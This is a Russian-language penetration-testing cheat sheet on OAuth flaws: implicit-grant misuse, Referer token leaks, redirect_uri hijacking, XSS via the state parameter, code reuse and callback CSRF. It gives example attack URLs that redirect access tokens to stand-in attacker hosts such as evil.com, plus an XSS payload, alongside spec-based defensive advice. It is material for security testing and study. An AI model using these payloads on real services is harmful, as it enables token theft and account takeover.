*  [Разведка](#Разведка)
*  [Кража токена OAuth через Referer](#Кража-токена-OAuth-через-Referer)
*  [Перехват токена OAuth через redirect_uri](#Перехват-токена-OAuth-через-redirect_uri)
*  [Выполнение XSS через redirect_uri](#Выполнение-XSS-через-redirect_uri)
*  [Раскрытие закрытого ключа OAuth](#Раскрытие-закрытого-ключа-OAuth)
*  [Нарушение правил использования authorization code](#Нарушение-правил-использования-authorization-code)
*  [Межсайтовая подделка запроса (CSRF)](#Межсайтовая-подделка-запроса-CSRF)

# Разведка
> Если используется внешняя служба OAuth, необходимо идентифицировать конкретного провайдера по имени хоста, на который отправляется запрос на авторизацию.

Узнав имя хоста сервера авторизации, вы всегда должны попытаться отправить запрос GET на следующие стандартные конечные точки:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
Они часто возвращают файл конфигурации JSON, содержащий ключевую информацию, например, подробности дополнительных функций, которые могут поддерживаться


# Уязвимости в клиентском приложении OAuth
Спецификация OAuth определена относительно слабо. Это особенно верно в отношении реализации клиентским приложением. В потоке OAuth много подвижных частей, с большим количеством необязательных параметров и настроек конфигурации в каждом типе предоставления, что означает, что есть много возможностей для неправильных конфигураций.
___________
# Неправильная реализация неявного типа предоставления

> Из-за опасностей, возникающих при отправке токенов доступа через браузер, неявный тип предоставления в основном рекомендуется для одностраничных приложений. Однако он также часто используется в классических клиент-серверных веб-приложениях из-за своей относительной простоты.

* Токен доступа отправляется из службы OAuth в клиентское приложение через браузер пользователя в виде фрагмента URL. 
* Клиентское приложение получает доступ к токену с помощью JavaScript.

> Проблема в том, что если приложение хочет сохранить сеанс после того, как пользователь закрывает страницу, ему необходимо где-то сохранить текущие данные пользователя (обычно идентификатор пользователя и токен доступа).

* Клиентское приложение часто отправляет эти данные на сервер в запросе POST, а затем назначает пользователю сеансовый cookie, фактически регистрируя его.
> Этот запрос примерно эквивалентен запросу отправки формы, который может быть отправлен как часть классического входа на основе пароля. Однако в этом сценарии у сервера нет никаких секретов или паролей для сравнения с отправленными данными, что означает, что он неявно доверен.

Если клиентское приложение не проверит должным образом, что токен доступа соответствует другим данным в запросе. В этом случае пользователь может просто изменить параметры, отправленные на сервер, чтобы выдать себя за любого пользователя.
________











# Кража токена OAuth через Referer

> У вас есть HTML-инъекция, но не получается выполнить XSS? На сайте есть реализации OAuth? Если да, настройте тег `img` на свой сервер и посмотрите, есть ли способ заставить пользователя перейти туда (редирект и т.д.) после входа в систему, чтобы украсть OAuth-токены через заголовок referer.

# Перехват токена OAuth через `redirect_uri`

**Перенаправление на контролируемый домен для получения access token**
```python
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

**Перенаправление на разрешенный Open URL для получения access token**
```python
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

> Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).

Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
```python
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

# Выполнение XSS через `redirect_uri`
```python
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

# Раскрытие закрытого ключа OAuth
Некоторые приложения для Android/iOS можно декомпилировать, и закрытый ключ OAuth может быть доступен.

# Нарушение правил использования authorization code
> **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**

Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.

# Межсайтовая подделка запроса (CSRF)

Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.

> Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.
